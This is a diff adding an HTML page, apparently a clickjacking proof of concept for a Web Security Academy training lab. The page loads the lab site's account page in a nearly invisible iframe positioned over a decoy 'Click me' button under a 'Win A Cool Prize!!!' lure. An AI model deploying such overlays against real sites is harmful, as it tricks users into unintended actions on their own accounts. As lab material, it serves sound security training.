@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Win A Cool Prize!!!</title>
+    <style>
+        button {
+            border-radius: 25px;
+            background-color: #159c80;
+            color: #fff;
+            font-size: 16px;
+            font-weight: bold;
+            padding: 7px 1em;
+            text-align: center;
+            min-width: 120px;
+        }
+		#target_website {
+			position:relative;
+			width: 700px;
+			height: 500px;
+			opacity:0.00001;
+			z-index:2;
+        }
+		#decoy_website {
+			position:absolute;
+			min-width: 120px;
+			height: 40px;
+			z-index:1;
+            top: 480px;
+            left: 35px;
+			}
+	</style>
+</head>
+<body>
+    <iframe id="target_website" src="https://[LAB_SUB_DOMAIN].web-security-academy.net/my-account"></iframe>
+    <div id="decoy_website">
+        <button>Click me</button>
+    </div>
+</body>
+</html>
